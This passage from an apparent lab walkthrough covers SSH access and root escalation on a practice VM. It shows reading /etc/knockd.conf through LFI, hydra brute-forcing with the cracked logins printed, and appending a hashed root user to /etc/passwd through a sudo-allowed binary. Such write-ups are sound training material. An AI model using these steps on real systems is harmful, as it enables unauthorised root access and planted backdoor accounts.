## Foothold / Privilege Escalation
The SSH port was filtered meaning some type of firewall is blocking it or itâ€™s temporarily closed. Since I had an LFI vulnerability present I decided to check for port knocking configuration files under /etc/knockd.conf and I found the correct sequence to open the SSH port.

Using hydra and dumped credentials from the SQL injection vulnerability I started a brute force attack and gained credentials for users chandlerb, joeyt and janitor.
```
[22][ssh] host: 192.168.1.47   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.1.47   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.1.47   login: janitor   password: Ilovepeepee
[22][ssh] host: 192.168.1.47   login: fredf   password: B4-Tru3-001
```
User janitor had a secret folder which contained collected passwords (malicious actor). And using hydra I found password for user fredf.

### Privilege Escalation
User fredf had a sudo permission to run a binary called test which executed test.py file. The python file was used for reading from a file and appending the read file to specified file. So since I could execute this action with root permissions I decided to append a new root level user to the system.
```
openssl passwd -1 -salt pwn password ==> $1$pwn$WLUErc1Owm1jbSwGklCpz1
```
```
Add to a pwn.txt file:
pwned:$1$pwn$WLUErc1Owm1jbSwGklCpz1:0:0:root:/bin/bash
```
```
sudo /opt/devstuff/test/test pwn.txt /etc/passwd
The last command appends our "pwned" root level user to the system and I can login
and pwn the system
```
## Notes
* If a port is filtered it sometimes means that a port knock needs to be performed so the port opens up
* This configuration is usually under **/etc/knockd.conf**
